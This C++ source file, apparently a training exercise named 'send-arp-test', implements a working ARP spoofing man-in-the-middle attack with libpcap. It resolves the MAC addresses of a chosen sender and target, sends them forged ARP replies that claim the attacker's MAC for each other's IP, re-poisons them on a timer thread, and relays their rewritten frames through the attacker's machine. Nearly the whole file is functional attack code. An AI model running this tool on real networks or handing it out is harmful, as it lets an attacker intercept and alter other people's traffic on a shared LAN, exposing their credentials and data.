#include <cstdio>
#include <pcap.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <thread>
#include <chrono>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <vector>
#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)
struct FlowInfo {
    std::string sender_ip;
    std::string target_ip;
    Mac sender_mac;
    Mac target_mac;
    std::thread spoof_thread;
};
std::vector<FlowInfo> active_flows;
int spoof_interval = 10;
char find_attacker_mac_ip(char* dev, uint8_t* attacker_mac, char* attacker_ip){
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == -1) {
        return EXIT_FAILURE;
    }

    int found = 0;

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL || !(ifa->ifa_flags & IFF_UP)) continue;

        if (strcmp(ifa->ifa_name, dev) == 0) {
            if (ifa->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
                inet_ntop(AF_INET, &addr->sin_addr, attacker_ip, INET_ADDRSTRLEN);
                  found = 1;
            }
            if (ifa->ifa_addr->sa_family == AF_PACKET) {
                struct sockaddr_ll *s = (struct sockaddr_ll *)ifa->ifa_addr;
                memcpy(attacker_mac, s->sll_addr, 6);
                found = 1;
            }
        }
    }
    freeifaddrs(ifaddr);
    return found ? EXIT_SUCCESS : EXIT_FAILURE;
}
void send_arp_reply(pcap_t* pcap, const char* spoofed_ip, const char* spoofing_ip, const Mac& spoofed_mac, const Mac& attacker_mac) {
    EthArpPacket reply;

    reply.eth_.dmac_ = spoofed_mac;
    reply.eth_.smac_ = attacker_mac;
    reply.eth_.type_ = htons(EthHdr::Arp);

    reply.arp_.hrd_ = htons(ArpHdr::ETHER);
    reply.arp_.pro_ = htons(EthHdr::Ip4);
    reply.arp_.hln_ = Mac::Size;
    reply.arp_.pln_ = Ip::Size;
    reply.arp_.op_ = htons(ArpHdr::Reply);

    reply.arp_.smac_ = attacker_mac;
    reply.arp_.sip_ = htonl(Ip(spoofing_ip));
    reply.arp_.tmac_ = spoofed_mac;
    reply.arp_.tip_ = htonl(Ip(spoofed_ip));

    pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&reply), sizeof(EthArpPacket));
}
void send_arp_request(pcap_t* pcap, const char* find_ip, const char* attacker_ip, uint8_t* find_mac, const uint8_t* attacker_mac){
    EthArpPacket request;
    request.eth_.dmac_ = Mac::broadcastMac();
    request.eth_.smac_ = Mac(attacker_mac);
    request.eth_.type_ = htons(EthHdr::Arp);

    request.arp_.hrd_ = htons(ArpHdr::ETHER);
    request.arp_.pro_ = htons(EthHdr::Ip4);
    request.arp_.hln_ = Mac::Size;
    request.arp_.pln_ = Ip::Size;
    request.arp_.op_ = htons(ArpHdr::Request);
    request.arp_.smac_ = Mac(attacker_mac);
    request.arp_.sip_ = htonl(Ip(attacker_ip));
    request.arp_.tmac_ = Mac::nullMac();
    request.arp_.tip_ = htonl(Ip(find_ip));

    pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&request), sizeof(EthArpPacket));
    while (true) {
        struct pcap_pkthdr *header;
        const u_char *recv_packet;

        int res = pcap_next_ex(pcap, &header, &recv_packet);
        if (res == 0) continue;

        struct EthHdr* eth = (struct EthHdr*)recv_packet;
        if (ntohs(eth->type_) != EthHdr::Arp) continue;

        struct ArpHdr* arp = (struct ArpHdr*)(recv_packet + sizeof(struct EthHdr));
        if (ntohs(arp->op_) != ArpHdr::Reply) continue;

        if (ntohl(arp->tip_) == htonl((uint32_t)inet_addr(attacker_ip))) {
            if (ntohl(arp->sip_) == htonl((uint32_t)inet_addr(find_ip))) {
                memcpy(find_mac, (uint8_t*)arp->smac_, ETHER_ADDR_LEN);
                break;
            }
        }
    }
}
std::thread arp_spoof_thread;

void start_arp_spoofing(pcap_t* pcap, const char* sender_ip, const char* target_ip, const Mac& sender_mac, const Mac& target_mac, const Mac& attacker_mac) {
    arp_spoof_thread = std::thread([=]() {
        while (true) {
            send_arp_reply(pcap, sender_ip, target_ip, sender_mac, attacker_mac);
            send_arp_reply(pcap, target_ip, sender_ip, target_mac, attacker_mac);
            std::this_thread::sleep_for(std::chrono::seconds(spoof_interval));
        }
    });
}

void stop_arp_spoofing() {
        if (arp_spoof_thread.joinable()) {
            arp_spoof_thread.join();
        }
}

void arp_spoofng(uint8_t* target_mac, char *target_ip, char *sender_ip, uint8_t* sender_mac, struct EthHdr* eth, pcap_t* pcap, bool& broadcast_received, uint8_t* attacker_mac)
{
    if (eth->dmac_ == Mac::broadcastMac()) {
        if (!broadcast_received) {
            start_arp_spoofing(pcap, sender_ip, target_ip, sender_mac, target_mac, attacker_mac);
            broadcast_received = true;
        }
    } else {
        stop_arp_spoofing();
        broadcast_received = false;
    }
}

void relay_packet(uint8_t* target_mac, struct pcap_pkthdr *header, uint8_t* attacker_mac, const u_char *recv_packet, struct EthHdr* eth, uint8_t* sender_mac, pcap_t* pcap)
{
    if (memcmp((uint8_t*)eth->smac_, sender_mac, Mac::Size) == 0 &&
        memcmp((uint8_t*)eth->dmac_, attacker_mac, Mac::Size) == 0) {

        u_char *packet_mod = new u_char[header->caplen];
        memcpy(packet_mod, recv_packet, header->caplen);

        struct EthHdr* eth_mod = (struct EthHdr*)packet_mod;

        memcpy((uint8_t*)eth_mod->smac_, attacker_mac, Mac::Size);
        memcpy((uint8_t*)eth_mod->dmac_, target_mac, Mac::Size);

        pcap_sendpacket(pcap, packet_mod, header->caplen);

        delete[] packet_mod;
    }
    else if (memcmp((uint8_t*)eth->smac_, target_mac, Mac::Size) == 0 &&
             memcmp((uint8_t*)eth->dmac_, attacker_mac, Mac::Size) == 0) {

        u_char *packet_mod = new u_char[header->caplen];
        memcpy(packet_mod, recv_packet, header->caplen);

        struct EthHdr* eth_mod = (struct EthHdr*)packet_mod;

        memcpy((uint8_t*)eth_mod->smac_, attacker_mac, Mac::Size);
        memcpy((uint8_t*)eth_mod->dmac_, sender_mac, Mac::Size);

        pcap_sendpacket(pcap, packet_mod, header->caplen);

        delete[] packet_mod;
    }
}


int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 == 1) {
        printf("send-arp-test <interface> <sender IP> <target IP> ...\n");
        printf("send-arp-test wlan0 172.30.1.97 172.30.1.254\n");
        return EXIT_FAILURE;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        return EXIT_FAILURE;
    }

    uint8_t attacker_mac[6] = {0}, sender_mac[6] = {0}, target_mac[6] = {0};
    char attacker_ip[INET_ADDRSTRLEN] = {0};

    find_attacker_mac_ip(dev, attacker_mac, attacker_ip);

    for (int i = 2; i < argc; i += 2) {
        char *sender_ip = argv[i];
        char *target_ip = argv[i + 1];
        send_arp_request(pcap, target_ip, attacker_ip, target_mac, attacker_mac);
        send_arp_request(pcap, sender_ip, attacker_ip, sender_mac, attacker_mac);
        send_arp_reply(pcap, target_ip, sender_ip, target_mac, attacker_mac);
        send_arp_reply(pcap, sender_ip, target_ip, sender_mac, attacker_mac);
        bool broadcast_received = false;
        while (true) {
            struct pcap_pkthdr *header;
            const u_char *recv_packet;
            int res = pcap_next_ex(pcap, &header, &recv_packet);
            struct EthHdr* eth = (struct EthHdr*)recv_packet;
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
            relay_packet(target_mac, header, attacker_mac, recv_packet, eth, sender_mac, pcap);
            arp_spoofng(target_mac, target_ip, sender_ip, sender_mac, eth, pcap, broadcast_received, attacker_mac);

        }
    }

    pcap_close(pcap);
    return 0;
}
